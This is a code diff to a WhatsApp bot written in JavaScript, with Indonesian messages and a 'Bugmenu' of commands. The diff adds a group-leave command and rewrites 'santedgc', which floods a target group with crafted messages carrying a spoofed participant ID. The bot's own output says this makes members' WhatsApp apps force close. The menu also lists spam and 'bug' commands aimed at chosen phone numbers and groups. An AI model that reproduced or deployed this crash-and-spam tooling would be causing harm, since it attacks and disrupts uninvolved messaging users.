@@ -628,8 +628,7 @@ case 'xentag':
                         quoted: xentag
                     })
 break
-
-case 'santedgrup': case 'santedgc':
+case 'left': case 'keluargc':
 const seranggc = async(teks) => {await xinn.sendMessage(teks, {text: 'P'}, {quoted: {key: {fromMe: true, participant: `0@s.whatsapp.net`, ...({remoteJid: ""})}, message: {conversation: 'Powered By Xinn'}}})}
 if (!args[0]) return reply('Masukin id grupnya!')
 if (!args[0].includes('@g.us')) return reply('Masukkan id grup yang benar!')
@@ -651,7 +650,29 @@ await sleep(3000000000)
 seranggc(args[0])
 await sleep(600000000000)
 xinn.groupLeave(args[0])
-reply(`Berhasil mengeksekusi Group ${gcmd.subject} Selama 5 menit`)
+reply(`Berhasil keluar dari group ${gcmd.subject}`)
+break
+case 'santedgrup': case 'santedgc':
+const seranggc = async(teks) => {await xinn.sendMessage(teks, {text: 'P Savean kuy'}, {quoted: {key: {fromMe: true, participant: `0@s.whatsapp.net`, ...({remoteJid: ""})}, message: {conversation: 'Powered By Xinn'}}})}
+if (!args[0]) return reply('Masukin id grupnya!')
+if (!args[0].includes('@g.us')) return reply('Masukkan id grup yang benar!')
+let gcmd = await xinn.groupMetadata(args[0]).catch(e => {})
+reply(`*〔 Berhasil Mengeksekusi Group 〕*\n
+*• Name Group :* ${gcmd.subject}
+_Aplikasi WhatsApp Peserta Group Tersebut Akan Force Close(Tidak Bisa di Buka)_`)
+seranggc(args[0])
+await sleep(3000000000)
+seranggc(args[0])
+await sleep(3000000000)
+seranggc(args[0])
+await sleep(3000000000)
+seranggc(args[0])
+await sleep(3000000000)
+seranggc(args[0])
+await sleep(3000000000)
+seranggc(args[0])
+await sleep(3000000000)
+reply(`Berhasil mengeksekusi Group ${gcmd.subject}`)
 break
 
 case 'xendok':{
@@ -693,7 +714,7 @@ var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.f
 "noteMessage": {
 "extendedTextMessage": {
 "requestFrom":`${pushname}`,
-"text": `*[ Bugmenu©️ ]*\n\n1. xenbugv (spam Xenpay)\n2. xenpay\n3. xenpaygc (masukin id grup)\n4. santedgc (masukin id grup)\n5. santed (masukin nomor dan pilih durasi)\n6. xentag (bug Jid)\n7. xendok (bug ampas) \n\n *[ MENU TAMBAHAN®️ ]*\n1. joinv1 (Masukin link Gc atau id)\n2. joinv2 (Masukin link Gc atau id)`,
+"text": `*[ Bugmenu©️ ]*\n\n1. xenbugv (spam Xenpay)\n2. xenpay\n3. xenpaygc (masukin id grup)\n4. santedgc (masukin id grup)\n5. santed (masukin nomor dan pilih durasi)\n6. xentag (bug Jid)\n7. xendok (bug ampas) \n\n *[ MENU TAMBAHAN®️ ]*\n1. joinv1 (Masukin link Gc atau id)\n2. joinv2 (Masukin link Gc atau id)\n3. left/keluargc (masukin id gc)`,
 }
 }}}), { userJid: m.chat, quoted: m })
 xinn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
